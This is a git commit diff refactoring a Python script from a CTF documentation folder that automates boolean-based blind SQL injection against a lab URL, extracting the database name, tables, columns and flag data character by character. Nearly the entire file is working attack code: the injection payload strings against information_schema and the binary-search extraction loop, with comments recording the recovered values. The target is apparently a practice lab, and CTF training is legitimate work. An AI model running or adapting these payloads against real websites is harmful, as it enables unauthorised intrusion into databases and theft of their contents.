cdc4a06ddada76497e1aa587359b7e7d55306149
wgf4242 <wgf4242@gmail.com>
2021-08-27 19:12:21 +0800

    sync

--- docs/ctf/scripts/web_sql_blind_01int.py
+++ docs/ctf/scripts/web_sql_blind_01int.py
@@ -1,39 +1,29 @@
-import sys
 import time
 from requests_html import AsyncHTMLSession, HTMLSession
-
-start_time = time.time()
-
-session = HTMLSession()
-proxies = {}
 
 url = 'http://inject2.lab.aqlab.cn:81/Pass-10/index.php?id=1'
 flag_success = '有数据'
 
 payload1_database_length = ' and length(database())={}'
 payload_database = ' and ord(substr(database(),{},1))>{}'
-payload_table =  ' and ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}'
-payload_column =  ' and ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}'
-payload_data =  ' and ord( SUBSTR((select group_concat({column_name}) from {table_name}),{},1))>{}'
+payload_table = ' and ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}'
+payload_column = ' and ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}'
+payload_data = ' and ord( SUBSTR((select group_concat({}) from {}),{},1))>{}'
+
+start_time = time.time()
+
+session = HTMLSession()
+proxies = {}
 
 
-def database_length():
-    for i in range(128):
-        sql = url + payload1_database_length.format(i)
-        res = session.get(sql)
-        if flag_success in res.text:
-            print('database length = ', i)
-            break
-
-
-def database():
+def go(title, payload):
     db = ''
     for i in range(1, 128):
-        s = search(i, payload_database)
+        s = search(i, payload)
         if not 32 < ord(s) <= 128:
             break
         db += s
-        print('database = ', db)
+        print(f'{title} = ', db)
 
 
 def search(index, payload):
@@ -54,39 +44,12 @@ def search(index, payload):
     return chr(mid)
 
 
-def table():
-    db = ''
-    for i in range(1, 128):
-        s = search(i, payload_table)
-        if not 32 < ord(s) <= 128:
-            break
-        db += s
-        print('table = ', db)
-
-
-def column(table_name):
-    db = ''
-    for i in range(1, 128):
-        s = search(i, payload_column.format(table_name, '{}', '{}'))
-        if not 32 < ord(s) <= 128:
-            break
-        db += s
-        print('column = ', db)
-
-
-def data(column_name, table_name):
-    db = ''
-    for i in range(1, 128):
-        s = search(i, payload_data.format('{}', '{}', column_name=column_name, table_name=table_name))
-        if not 32 < ord(s) <= 128:
-            break
-        db += s
-        print('data = ', db)
-
 if __name__ == '__main__':
-    # database_length()
-    # database()          # 'kanwolongxia'
-    # table()             # 'loflag'
-    # column('loflag')      # Id,flaglo
-    data('flaglo','loflag')      # Id,flaglo
+    table_name = 'loflag'
+    column_name = 'flaglo'
+
+    # go('database', payload_database)  # 'kanwolongxia'
+    # go('table', payload_table)  # 'loflag'
+    # go('column', payload_column.format(table_name, '{}', '{}'))  # Id,flaglo
+    go('data', payload_data.format(column_name, table_name, '{}', '{}'))
     print("--- %s seconds ---" % (time.time() - start_time))
